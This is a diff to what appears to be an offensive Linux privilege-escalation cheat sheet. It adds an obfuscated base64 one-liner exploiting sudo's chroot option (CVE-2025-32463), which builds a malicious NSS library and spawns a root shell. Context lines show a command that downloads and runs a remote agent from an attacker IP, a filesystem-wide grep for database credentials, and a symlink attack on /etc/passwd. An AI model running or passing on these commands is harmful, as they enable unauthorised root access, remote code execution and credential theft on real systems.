@@ -1506,6 +1506,10 @@ curl $MYIP:53/linux/agent -o /dev/shm/agent;chmod +x /dev/shm/agent;/dev/shm/age
 +---------- Creds In DB Files ----------+
 grep -IrinE "db[-_]?(user|pass|login)\w*" / 2>/dev/null
 
++---------- SUDO Exploits ----------+
+-->> 1.9.14 – 1.9.17  (CVE-2025-32463 chwoot)
+echo 'WD0kKG1rdGVtcCAtZCAvdG1wL1hYWFhYWCkKY2QgJHtYP30gfHwgZXhpdCAxCgpjYXQgPiBYLmM8PEVPRgojaW5jbHVkZSA8c3RkbGliLmg+CiNpbmNsdWRlIDx1bmlzdGQuaD4KCl9fYXR0cmlidXRlX18oKGNvbnN0cnVjdG9yKSkgdm9pZCBYKHZvaWQpIHsKICBzZXRyZXVpZCgwLDApOwogIHNldHJlZ2lkKDAsMCk7CiAgY2hkaXIoIi8iKTsKICBleGVjbCgiL2Jpbi9iYXNoIiwgIi9iaW4vYmFzaCIsIE5VTEwpOwp9CkVPRgoKbWtkaXIgLXAgWC9ldGMgbGlibnNzXwplY2hvICJwYXNzd2Q6IC9YIiA+IFgvZXRjL25zc3dpdGNoLmNvbmYKY3AgL2V0Yy9ncm91cCBYL2V0YwpnY2MgLXNoYXJlZCAtZlBJQyAtV2wsLWluaXQsWCAtbyBsaWJuc3NfL1guc28uMiBYLmMKCnN1ZG8gLVIgWCBYCnJtIC1yZiAke1g/fQo=' | base64 -d > /tmp/root.sh; chmod +x /tmp/root.sh; /tmp/root.sh
+
 +---------- Symlink: Writeable Root File ----------+
 ln -sf /etc/passwd /var/log/below/error_root.log
 
